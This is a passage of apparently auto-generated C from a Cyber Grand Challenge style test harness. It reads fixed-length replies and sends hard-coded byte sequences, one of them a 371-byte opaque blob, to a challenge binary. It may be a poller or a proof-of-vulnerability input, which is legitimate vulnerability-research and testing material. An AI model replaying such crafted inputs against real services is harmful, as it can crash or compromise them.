         cgc_transmit_all(1, write_00074, write_00074_len);
      }
      cgc_free(write_00074);
   } while (0);
   do {
      unsigned char *read_00075;
      unsigned int read_00075_len;
      unsigned int read_00075_ptr = 0;
      //**** length read
      read_00075_len = 25;
      read_00075 = (unsigned char*)cgc_malloc(read_00075_len);
      int read_00075_res = cgc_length_read(0, read_00075, read_00075_len);
      if (read_00075_res) {} //silence unused variable warning
      cgc_free(read_00075);
      if (read_00075_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00075_00000[] = 
         "\x49\x43\x72\x23\x85\x51\xd3\x07\x14\x0a";
      static unsigned int write_00075_00000_len = 10;
      unsigned char *write_00075 = NULL;
      unsigned int write_00075_len = 0;
      write_00075 = cgc_append_buf(write_00075, &write_00075_len, write_00075_00000, write_00075_00000_len);
      if (write_00075_len > 0) {
         cgc_transmit_all(1, write_00075, write_00075_len);
      }
      cgc_free(write_00075);
   } while (0);
   do {
      unsigned char *read_00076;
      unsigned int read_00076_len;
      unsigned int read_00076_ptr = 0;
      //**** length read
      read_00076_len = 25;
      read_00076 = (unsigned char*)cgc_malloc(read_00076_len);
      int read_00076_res = cgc_length_read(0, read_00076, read_00076_len);
      if (read_00076_res) {} //silence unused variable warning
      cgc_free(read_00076);
      if (read_00076_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00076_00000[] = 
         "\x31\x5d\xc1\xd0\xf0\xfa\x75\xe2\x4a\x82\x2a\x97\xb4\x0d\x6c\x5d"
         "\x5b\xec\x6a\xb4\x17\xd0\x02\x43\xfe\xd2\xc6\xb0\x1f\xea\x45\x20"
         "\xde\x80\x20\xb6\x4d\x02\xbe\x40\x7e\x7c\x43\xbf\xd6\x3b\x30\xda"
         "\x87\x89\x9b\x4f\xc4\xc4\x46\x92\x10\xd2\x61\x14\xb2\x49\xc6\xf4"
         "\x82\x63\x2a\x8e\xd8\xaf\xe9\x5a\xe6\x93\x09\x1f\x89\x19\xff\xbb"
         "\x25\x57\xdf\x39\x4d\x0b\x32\xaa\x6d\x2d\x96\xb3\x0d\x15\x9e\x0e"
         "\x5e\x6c\xbb\x5f\x1a\xc8\x42\x83\xc8\x3d\x47\x82\x27\xce\x87\xab"
         "\xd4\xb2\x26\xb0\x60\xe8\x61\x04\x26\x92\x04\x07\xe3\xbc\x73\xd8"
         "\x01\x2e\x60\x7e\x0c\xbc\x4d\xff\xdd\xc2\x88\xe9\x6f\x23\x53\xff"
         "\x33\xc3\x14\x88\x39\xdd\x39\x7a\xcd\x86\x36\xc3\xc7\x97\x3e\xf0"
         "\x3f\x0b\xad\x31\xc3\x67\x2c\xca\xf8\x11\xcc\xc1\x21\x8a\x15\xbd"
         "\xd3\xe6\x4f\x61\x3e\x7a\x79\xcc\x75\xdf\x84\x88\x38\xbf\x4a\x24"
         "\x66\xcd\x11\x95\x77\x5e\xce\xcd\xf2\x15\x57\x63\x2c\x28\xc3\x63"
         "\xbb\x7d\x06\x39\x21\x44\xb1\x23\x3b\x8f\x38\x17\xbd\x02\x7d\x2d"
         "\xd3\x28\x43\x53\x88\x69\x0c\xb5\x22\x13\x80\xf3\x50\xb7\xd2\xcf"
         "\x8d\xee\x44\xd6\x51\x21\x62\x91\x43\xfd\x8c\x49\xce\x04\x57\xd4"
         "\x9b\x57\x5b\xd0\x8c\x0e\xda\x51\x63\xe5\xe1\xdd\x5d\x72\x13\x1b"
         "\x95\xfc\x52\x13\x2e\xa3\x97\xef\x2d\x39\xef\x49\xf5\x55\xc2\x0d"
         "\xdf\xfd\xf6\x86\x8b\x5d\x85\xb5\x0a\xed\xd8\xb6\x3b\x2b\x2f\x76"
         "\x2b\xd0\xc3\xf0\x31\x79\xc8\x88\x61\xc5\x0a\x36\x22\x14\xf2\x0b"
         "\x54\xa3\x52\xbf\x98\xf7\x3e\xc2\x65\xf7\xe8\xce\x39\xd4\x7d\x6b"
         "\x3c\x96\x77\xd1\xdc\x31\x33\x34\x6e\x16\xd3\x7b\xbf\x35\xd6\x40"
         "\x2d\xb7\x90\x3a\xa3\x9b\x04\x58\xc0\xc7\x31\xaf\x4c\x7b\x37\xf5"
         "\x7f\xe4\x00";
      static unsigned int write_00076_00000_len = 371;
      unsigned char *write_00076 = NULL;
      unsigned int write_00076_len = 0;
      write_00076 = cgc_append_buf(write_00076, &write_00076_len, write_00076_00000, write_00076_00000_len);
      if (write_00076_len > 0) {
         cgc_transmit_all(1, write_00076, write_00076_len);
      }
      cgc_free(write_00076);
   } while (0);
   //*** delay
   cgc_delay(1000);
}
